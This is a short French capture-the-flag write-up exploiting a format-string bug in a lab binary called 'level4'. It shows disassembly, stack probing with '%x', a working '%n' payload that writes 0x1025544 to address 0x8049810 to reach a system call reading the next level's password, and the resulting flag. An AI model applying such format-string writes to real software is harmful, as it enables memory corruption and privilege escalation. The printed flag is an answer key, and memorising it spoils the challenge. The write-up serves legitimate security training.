Dans ce niveau quand on ```disas main``` on voit que main call ```n``` et lui call ```p``` a son tour

Dans la fonction ```n``` on voit un appel system a ```"/bin/cat /home/user/level5/.pass"``` apres le retour de ```p```

```sh
   0x08048488 <+49>:	call   0x8048444 <p>
   0x0804848d <+54>:	mov    0x8049810,%eax
   0x08048492 <+59>:	cmp    $0x1025544,%eax
   0x08048497 <+64>:	jne    0x80484a5 <n+78>
   0x08048499 <+66>:	movl   $0x8048590,(%esp)
   0x080484a0 <+73>:	call   0x8048360 <system@plt>
```

Et dans la fonction ```p``` il y a un appel a ```printf(buffer)``` qu'on va exploiter

On vise donc cette comparison pour arriver a l'appel system ```0x08048492 <+59>:	cmp    $0x1025544,%eax```

Il faut chercher on se trouve notre input ```AAAA %x %x %x %x %x %x %x %x %x %x %x %x```:
    ```AAAA b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 41414141```

Il est donc a la 12eme place dans la memoire avec ```41414141```

On va chercher a mettre ```0x1025544 = 16930116 en decimal``` a cette adresse ```0x8049810```

Ce script va nous le permettre: ```(python -c 'print "\x10\x98\x04\x08" + "%16930112c%12$n"') | ./level4```

On ecrit ```16930116 - 4 = 16930112``` caracteres avec la valeur a cette adresse ```\x10\x98\x04\x08``` au 12eme emplacement

Le flag s'affiche apres la redaction des caracteres: ```0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a```